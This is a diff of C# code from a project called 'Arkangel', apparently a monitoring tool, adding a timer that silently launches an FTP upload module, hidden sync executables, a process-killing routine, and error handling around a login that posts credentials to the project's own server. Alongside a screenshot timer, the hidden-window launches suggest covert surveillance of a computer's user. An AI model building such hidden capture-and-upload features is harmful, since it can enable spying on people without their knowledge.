@@ -12,7 +12,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Timers;
-
+using System.Windows;
 
 namespace Arkangel
 {
@@ -50,16 +50,23 @@ namespace Arkangel
         }
         public static string Login( string username,string passsword)
         {
-            string formUrl = "http://www.arkangel.tk/logginUpload"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
-            WebClient wc = new WebClient();
-            byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
+            try
             {
-                {"email",username},
-                {"password",passsword}
-            });
-            string _response = Encoding.ASCII.GetString(resp);
-            Console.WriteLine(_response);
-            return _response;
+                string formUrl = "http://www.arkangel.tk/logginUpload"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
+                WebClient wc = new WebClient();
+                byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
+                {
+                      {"email",username},
+                      {"password",passsword}
+                 });
+                string _response = Encoding.ASCII.GetString(resp);
+                Console.WriteLine(_response);
+                return _response;
+            }
+            catch
+            {
+                return "Error";
+            }
         }
         public static bool IsUserAdministrator()
         {
@@ -130,6 +137,28 @@ namespace Arkangel
                 }
             }
         }
+        //Timer for FTP
+        public static void SetTimerFTP(int _time)
+        {
+            // Create a timer with a two second interval.
+            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
+            // Hook up the Elapsed event for the timer. 
+            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventFTP;
+            MainWindow.aTimer_scrshot.AutoReset = true;
+            MainWindow.aTimer_scrshot.Enabled = true;
+        }
+        public static void OnTimedEventFTP(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "ftp.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+        }
 
         // Timer for screenshot
         public static void SetTimerScreenShot(int _time)
@@ -153,13 +182,45 @@ namespace Arkangel
             }
             catch { }
         }
-        public static void syncServer()
+        public static void syncUp()
         {
             try
             {
                 ProcessStartInfo start = new ProcessStartInfo();
                 start.WorkingDirectory = @"..\..\module\";
                 start.FileName = "sync_up.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+        }
+        public static void EndTask(string taskname)
+        {
+            string processName = taskname;
+            string fixstring = taskname.Replace(".exe", "");
+
+            if (taskname.Contains(".exe"))
+            {
+                foreach (Process process in Process.GetProcessesByName(fixstring))
+                {
+                    process.Kill();
+                }
+            }
+            else if (!taskname.Contains(".exe"))
+            {
+                foreach (Process process in Process.GetProcessesByName(processName))
+                {
+                    process.Kill();
+                }
+            }
+        }
+        public static void syncDown()
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "sync.exe";
                 start.WindowStyle = ProcessWindowStyle.Hidden;
                 Process.Start(start);
             }
